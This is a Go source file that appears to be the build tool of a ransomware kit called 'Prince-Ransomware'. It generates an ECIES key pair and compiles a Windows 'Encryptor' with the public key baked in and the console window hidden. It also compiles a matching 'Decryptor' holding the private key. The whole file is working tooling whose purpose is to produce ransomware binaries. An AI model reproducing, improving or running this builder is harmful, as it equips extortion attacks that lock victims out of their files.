package main

import (
	"fmt"
	"os"
	"os/exec"
	"time"

	eciesgo "github.com/ecies/go"
)

var startupBanner = `
██████╗ ██████╗ ██╗███╗   ██╗ ██████╗███████╗
██╔══██╗██╔══██╗██║████╗  ██║██╔════╝██╔════╝
██████╔╝██████╔╝██║██╔██╗ ██║██║     █████╗  
██╔═══╝ ██╔══██╗██║██║╚██╗██║██║     ██╔══╝  
██║     ██║  ██║██║██║ ╚████║╚██████╗███████╗
╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
                                             
`

func main() {
	// Clear the console
	cmd := exec.Command("cmd", "/c", "cls")
	cmd.Stdout = os.Stdout
	err := cmd.Run()
	if err != nil {
		fmt.Printf("Failed to clear console: %v\n", err)
		return
	}

	fmt.Print(startupBanner)

	// Generate ECIES key pair
	priv, pub, err := generateECIESKeyPair()
	if err != nil {
		fmt.Printf("Error generating ECIES key pair: %v\n", err)
		return
	}

	fmt.Printf("Private Key (Hex): %s\n", priv.Hex())
	fmt.Printf("Public Key (Hex): %s\n", pub.Hex(false))

	// Compile the encryptor
	if err := compileEncryptor(pub.Hex(false)); err != nil {
		fmt.Printf("Error compiling encryptor: %v\n", err)
		return
	}

	// Compile the decryptor
	if err := compileDecryptor(priv.Hex()); err != nil {
		fmt.Printf("Error compiling decryptor: %v\n", err)
		return
	}

	fmt.Println("Build successful")
}

func generateECIESKeyPair() (*eciesgo.PrivateKey, *eciesgo.PublicKey, error) {
	key, err := eciesgo.GenerateKey()
	if err != nil {
		return nil, nil, err
	}
	return key, key.PublicKey, nil
}

func compileEncryptor(pubKeyHex string) error {
	fmt.Println("Compiling Encryptor...")
	startTime := time.Now()

	err := os.Chdir("Encryptor")
	if err != nil {
		return fmt.Errorf("failed to change directory to Encryptor: %w", err)
	}

	ldflags := fmt.Sprintf("-H=windowsgui -s -w -X 'Prince-Ransomware/configuration.PublicKey=%s'", pubKeyHex)
	cmd := exec.Command("cmd", "/C", "go", "build", "-ldflags", ldflags, "-o", "../Prince-Built.exe")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Run()
	if err != nil {
		return fmt.Errorf("build failed: %w", err)
	}

	fmt.Printf("Encryptor compiled successfully in %v\n", time.Since(startTime))
	return nil
}

func compileDecryptor(privKeyHex string) error {
	fmt.Println("Compiling Decryptor...")
	startTime := time.Now()

	err := os.Chdir("../Decryptor")
	if err != nil {
		return fmt.Errorf("failed to change directory to Decryptor: %w", err)
	}

	ldflags := fmt.Sprintf("-H=windowsgui -s -w -X 'Prince-Decryptor/configuration.PrivateKey=%s'", privKeyHex)
	cmd := exec.Command("cmd", "/C", "go", "build", "-ldflags", ldflags, "-o", "../Decryptor-Built.exe")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Run()
	if err != nil {
		return fmt.Errorf("build failed: %w", err)
	}

	fmt.Printf("Decryptor compiled successfully in %v\n", time.Since(startTime))
	return nil
}
